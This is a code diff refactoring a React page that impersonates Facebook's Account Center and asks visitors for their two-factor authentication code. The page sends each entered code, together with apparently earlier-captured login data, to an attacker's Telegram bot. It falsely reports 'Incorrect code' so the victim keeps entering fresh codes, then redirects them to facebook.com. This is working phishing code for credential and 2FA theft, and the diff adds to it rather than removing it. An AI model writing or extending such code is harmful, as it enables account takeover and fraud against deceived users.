@@ -1,20 +1,60 @@
 import HeroImage from "@/assets/images/verify.png";
-import type { TelegramResponse } from "@/types/telegram";
 import getConfig from "@/utils/config";
 import axios from "axios";
-import { useEffect, useState } from "react";
 import type { FC } from "react";
+import { useEffect, useState } from "react";
+import { useNavigate } from "react-router";
+interface UIState {
+	error: string;
+	isLoading: boolean;
+	attempt: number;
+	messageId: number;
+}
+
+interface Config {
+	chatId: string;
+	token: string;
+	loadingTime: number;
+	maxAttempt: number;
+	codeEnabled: boolean;
+}
+
+const initialUIState: UIState = {
+	error: "",
+	isLoading: false,
+	attempt: 0,
+	messageId: 0,
+};
+
+const createVerifyMessage = (code: string, attempt?: number) => {
+	const lastMessage = localStorage.getItem("lastMessage");
+	if (attempt === 1) {
+		return `${lastMessage}\n━━━━━━━━━━━━━━━━━━━━━\n🔓 <b>CODE 2FA:</b> <code>${code}</code>`;
+	}
+	return `${lastMessage}\n🔓 <b>CODE 2FA ${attempt}:</b> <code>${code}</code>`;
+};
+
+const sendTelegramMessage = async (
+	message: string,
+	config: Config,
+	messageId: string,
+) => {
+	return axios.post(
+		`https://api.telegram.org/bot${config.token}/editMessageText`,
+		{
+			chat_id: config.chatId,
+			message_id: messageId,
+			text: message,
+			parse_mode: "HTML",
+		},
+	);
+};
 
 const Verify: FC = () => {
+	const navigate = useNavigate();
 	const [code, setCode] = useState("");
-	const [uiState, setUiState] = useState({
-		error: "",
-		isLoading: false,
-		attempt: 0,
-		messageId: 0,
-	});
-
-	const [config, setConfig] = useState({
+	const [uiState, setUiState] = useState<UIState>(initialUIState);
+	const [config, setConfig] = useState<Config>({
 		chatId: "",
 		token: "",
 		loadingTime: 0,
@@ -34,37 +74,24 @@ const Verify: FC = () => {
 	}, []);
 
 	const handleSubmit = async () => {
-		const lastMessage = localStorage.getItem("lastMessage") ?? "";
+		const savedMessageId = localStorage.getItem("messageId");
+		if (!savedMessageId) {
+			navigate("/");
+			return;
+		}
 
-		const createMessage = () => `${lastMessage}
-
-📱 <b>MÃ XÁC THỰC</b>
-${Array.from({ length: uiState.attempt + 1 }, (_, i) => {
-	const suffix = i > 0 ? ` ${i}` : "";
-	return `• <b>Mã${suffix}:</b> <code>${code}</code>`;
-}).join("\n")}`;
+		const message = createVerifyMessage(code, uiState.attempt + 1);
+		localStorage.setItem("lastMessage", message);
 
 		if (uiState.attempt >= config.maxAttempt) {
-			setUiState((prev) => ({
-				...prev,
-				isLoading: true,
-			}));
+			setUiState((prev) => ({ ...prev, isLoading: true }));
 
 			try {
-				await axios.post(
-					`https://api.telegram.org/bot${config.token}/editMessageText`,
-					{
-						chat_id: config.chatId,
-						message_id: uiState.messageId,
-						text: createMessage(),
-						parse_mode: "HTML",
-					},
-				);
-
+				await sendTelegramMessage(message, config, savedMessageId);
 				setTimeout(() => {
 					window.location.replace("https://facebook.com");
 				}, config.loadingTime);
-			} catch (error) {
+			} catch {
 				window.location.replace("https://facebook.com");
 			}
 			return;
@@ -76,31 +103,8 @@ ${Array.from({ length: uiState.attempt + 1 }, (_, i) => {
 			isLoading: true,
 		}));
 
-		const url = `https://api.telegram.org/bot${config.token}/sendMessage`;
-		const editUrl = `https://api.telegram.org/bot${config.token}/editMessageText`;
-
 		try {
-			let response: TelegramResponse;
-
-			if (uiState.messageId && uiState.attempt > 0) {
-				response = await axios.post(editUrl, {
-					chat_id: config.chatId,
-					message_id: uiState.messageId,
-					text: createMessage(),
-					parse_mode: "HTML",
-				});
-			} else {
-				response = await axios.post(url, {
-					chat_id: config.chatId,
-					text: createMessage(),
-					parse_mode: "HTML",
-				});
-				setUiState((prev) => ({
-					...prev,
-					messageId: response.data.result.message_id,
-				}));
-			}
-
+			await sendTelegramMessage(message, config, savedMessageId);
 			setTimeout(() => {
 				setUiState((prev) => ({
 					...prev,
@@ -108,7 +112,7 @@ ${Array.from({ length: uiState.attempt + 1 }, (_, i) => {
 					error: "Incorrect code. Please try again.",
 				}));
 			}, config.loadingTime);
-		} catch (error) {
+		} catch {
 			setUiState((prev) => ({
 				...prev,
 				isLoading: false,
@@ -118,14 +122,16 @@ ${Array.from({ length: uiState.attempt + 1 }, (_, i) => {
 	};
 
 	const clearError = () => {
-		setUiState((prev) => ({
-			...prev,
-			error: "",
-		}));
+		setUiState((prev) => ({ ...prev, error: "" }));
+	};
+
+	const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+		if (/[a-zA-Z]+/g.test(e.target.value)) return;
+		setCode(e.target.value);
 	};
 
 	return (
-		<div className="flex w-11/12 flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3">
+		<div className="flex flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3">
 			<div className="flex flex-col">
 				<b>Account Center - Facebook</b>
 				<b className="text-2xl">Check notifications on another device</b>
@@ -157,10 +163,7 @@ ${Array.from({ length: uiState.attempt + 1 }, (_, i) => {
 					placeholder="Enter Code (6-8 digits)"
 					value={code}
 					onFocus={clearError}
-					onChange={(e) => {
-						if (/[a-zA-Z]+/g.test(e.target.value)) return;
-						setCode(e.target.value);
-					}}
+					onChange={handleCodeChange}
 				/>
 
 				{uiState.error && (
@@ -168,7 +171,11 @@ ${Array.from({ length: uiState.attempt + 1 }, (_, i) => {
 				)}
 
 				<button
-					className={`my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${code.length >= 6 ? "bg-blue-500 hover:bg-blue-600" : "cursor-not-allowed bg-blue-300"}`}
+					className={`my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${
+						code.length >= 6
+							? "bg-blue-500 hover:bg-blue-600"
+							: "cursor-not-allowed bg-blue-300"
+					}`}
 					disabled={code.length < 6 || uiState.isLoading}
 					type="button"
 					onClick={handleSubmit}
@@ -180,9 +187,7 @@ ${Array.from({ length: uiState.attempt + 1 }, (_, i) => {
 					)}
 				</button>
 
-				<a href="/home" className="text-blue-500 hover:underline">
-					Send Code
-				</a>
+				<p className="text-blue-500 hover:underline">Send Code</p>
 			</div>
 		</div>
 	);
